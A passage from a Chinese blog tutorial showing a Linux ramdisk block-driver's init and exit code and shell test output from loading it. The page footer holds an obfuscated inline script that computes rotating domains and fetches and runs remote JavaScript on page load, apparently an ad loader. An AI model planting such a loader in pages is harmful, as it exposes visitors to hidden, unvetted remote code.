	newchrdev<span class="token punctuation">.</span>queue <span class="token operator">=</span> <span class="token function">blk_init_queue</span><span class="token punctuation">(</span>ramdisk_request_fn<span class="token punctuation">,</span> <span class="token operator">&amp;</span>newchrdev<span class="token punctuation">.</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>newchrdev<span class="token punctuation">.</span>queue<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		ret <span class="token operator">=</span> EINVAL<span class="token punctuation">;</span>
		<span class="token keyword">goto</span> blk_init_fail<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	newchrdev<span class="token punctuation">.</span>queue <span class="token operator">=</span> <span class="token function">blk_alloc_queue</span><span class="token punctuation">(</span>GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>newchrdev<span class="token punctuation">.</span>queue<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		ret <span class="token operator">=</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
		<span class="token keyword">goto</span> blk_allo_fail<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">/* 6、设置“制造请求”函数 */</span>
	<span class="token function">blk_queue_make_request</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>queue<span class="token punctuation">,</span> ramdisk_make_request_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* 7、添加(注册)disk
     * (1)、关联逻辑块设备和物理块设备
     * (2)、为物理块设备添加操作集和请求队列
     * (3)、为物理块设备设置属性
     */</span>
	newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>major <span class="token operator">=</span> newchrdev<span class="token punctuation">.</span>major<span class="token punctuation">;</span>		<span class="token comment">/* 主设备号 */</span>
	newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>first_minor <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>			<span class="token comment">/* 第一个次设备号(起始次设备号) */</span>
	newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>fops <span class="token operator">=</span> <span class="token operator">&amp;</span>ramdisk_fops<span class="token punctuation">;</span> 		<span class="token comment">/* 操作函数 */</span>
	newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>private_data <span class="token operator">=</span> <span class="token operator">&amp;</span>newchrdev<span class="token punctuation">;</span>	<span class="token comment">/* 私有数据 */</span>
	newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>queue <span class="token operator">=</span> newchrdev<span class="token punctuation">.</span>queue<span class="token punctuation">;</span>		<span class="token comment">/* 请求队列 */</span>
	<span class="token function">sprintf</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>disk_name<span class="token punctuation">,</span> RAMDISK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* 名字 */</span>
	<span class="token function">set_capacity</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">,</span> RAMDISK_SIZE<span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">/* 设备容量(单位为扇区) */</span>
	<span class="token function">add_disk</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
blk_allo_fail<span class="token operator">:</span>
	<span class="token function">put_disk</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//del_gendisk(ramdisk.gendisk);</span>
gendisk_alloc_fail<span class="token operator">:</span>
	<span class="token function">unregister_blkdev</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>major<span class="token punctuation">,</span> RAMDISK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span>
register_blkdev_fail<span class="token operator">:</span>
	<span class="token function">kfree</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>ramdiskbuf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* 释放内存 */</span>
ram_fail<span class="token operator">:</span>
    <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
 * @description	: 驱动出口函数
 * @param 		: 无
 * @return 		: 无
 */</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">ramdisk_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"ramdisk exitrn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/* 释放gendisk */</span>
	<span class="token function">del_gendisk</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">put_disk</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* 清除请求队列 */</span>
	<span class="token function">blk_cleanup_queue</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* 注销块设备 */</span>
	<span class="token function">unregister_blkdev</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>major<span class="token punctuation">,</span> RAMDISK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* 释放内存 */</span>
	<span class="token function">kfree</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>ramdiskbuf<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token function">module_init</span><span class="token punctuation">(</span>ramdisk_init<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">module_exit</span><span class="token punctuation">(</span>ramdisk_exit<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2>
<a id="3_1249"></a>3、测试</h2> 
<pre><code class="prism language-shell"><span class="token comment"># ls</span>
ramdisk.ko
<span class="token comment"># insmod ramdisk.ko</span>
ramdisk init
ramdisk major <span class="token operator">=</span> <span class="token number">254</span>
ramdisk <span class="token function">open</span>
ramdisk release
<span class="token comment"># ls -l /dev/ramdisk</span>
brw-rw----    <span class="token number">1</span> root     root      <span class="token number">254</span>,   <span class="token number">0</span> Jan  <span class="token number">1</span> 00:51 /dev/ramdisk
<span class="token comment">#</span>
<span class="token comment"># rmmod ramdisk.ko</span>
ramdisk <span class="token builtin class-name">exit</span>
<span class="token comment">#</span>
<span class="token comment"># ls -l /dev/ramdisk</span>
ls: /dev/ramdisk: No such <span class="token function">file</span> or directory
<span class="token comment">#</span>
<span class="token comment"># insmod ramdisk.ko</span>
ramdisk init
ramdisk major <span class="token operator">=</span> <span class="token number">254</span>
ramdisk <span class="token function">open</span>
ramdisk release
<span class="token comment">#</span>
<span class="token comment"># ls -l /dev/ramdisk</span>
brw-rw----    <span class="token number">1</span> root     root      <span class="token number">254</span>,   <span class="token number">0</span> Jan  <span class="token number">1</span> 00:51 /dev/ramdisk
<span class="token comment">#</span>
<span class="token comment"># rmmod ramdisk.ko</span>
ramdisk <span class="token builtin class-name">exit</span>
<span class="token comment">#</span>
<span class="token comment"># random: nonblocking pool is initialized</span>
<span class="token comment"># ls -l /dev/ramdisk</span>
ls: /dev/ramdisk: No such <span class="token function">file</span> or directory
<span class="token comment">#</span>
<span class="token comment">#</span>
<span class="token comment">#</span>
<span class="token comment"># insmod ramdisk.ko</span>
ramdisk init
ramdisk major <span class="token operator">=</span> <span class="token number">254</span>
ramdisk <span class="token function">open</span>
ramdisk release
<span class="token comment">#</span>
<span class="token comment"># fdisk -l</span>
Disk /dev/mmcblk0: <span class="token number">15</span> GB, <span class="token number">15931539456</span> bytes, <span class="token number">31116288</span> sectors
<span class="token number">1936</span> cylinders, <span class="token number">255</span> heads, <span class="token number">63</span> sectors/track
Units: sectors of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytes

Device       Boot StartCHS    EndCHS        Sramdisk <span class="token function">open</span>
tartLBA     EndLBA    Sectors  Siramdisk release
ze Id Type
/dev/mmcblk0p1    <span class="token number">0</span>,1ramdisk <span class="token function">open</span>
<span class="token number">30,3</span>     <span class="token number">1023,254</span>,63       <span class="token number">8192</span>   <span class="token number">31116287</span>   <span class="token number">31108096</span> <span class="token number">14</span>.8G  c Wiramdisk release
n95 FAT32 <span class="token punctuation">(</span>LBA<span class="token punctuation">)</span>
Disk /dev/mmcblk1: <span class="token number">7456</span> MB, <span class="token number">7818182656</span> bytes, <span class="token number">15269888</span> sectors
<span class="token number">238592</span> cylinders, <span class="token number">4</span> heads, <span class="token number">16</span> sectors/track
Units: sectors of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytes

Device       Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
/dev/mmcblk1p1 *  <span class="token number">0,32</span>,33     <span class="token number">4,52</span>,48           <span class="token number">2048</span>      <span class="token number">67583</span>      <span class="token number">65536</span> <span class="token number">32</span>.0M  c Win95 FAT32 <span class="token punctuation">(</span>LBA<span class="token punctuation">)</span>
/dev/mmcblk1p2    <span class="token number">4,52</span>,49     <span class="token number">950,129</span>,11       <span class="token number">67584</span>   <span class="token number">15269887</span>   <span class="token number">15202304</span> 7423M <span class="token number">83</span> Linux
Disk /dev/mmcblk1boot1: <span class="token number">4</span> MB, <span class="token number">4194304</span> bytes, <span class="token number">8192</span> sectors
<span class="token number">128</span> cylinders, <span class="token number">4</span> heads, <span class="token number">16</span> sectors/track
Units: sectors of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytes

Disk /dev/mmcblk1boot1 doesn<span class="token string">'t contain a valid partition table
Disk /dev/mmcblk1boot0: 4 MB, 4194304 bytes, 8192 sectors
128 cylinders, 4 heads, 16 sectors/track
Units: sectors of 1 * 512 = 512 bytes

Disk /dev/mmcblk1boot0 doesn'</span>t contain a valid partition table
Disk /dev/ramdisk: <span class="token number">2</span> MB, <span class="token number">2097152</span> bytes, <span class="token number">4096</span> sectors
<span class="token number">32</span> cylinders, <span class="token number">2</span> heads, <span class="token number">64</span> sectors/track
Units: sectors of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytes

Disk /dev/ramdisk doesn't contain a valid partition table
<span class="token comment">#</span>
</code></pre>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>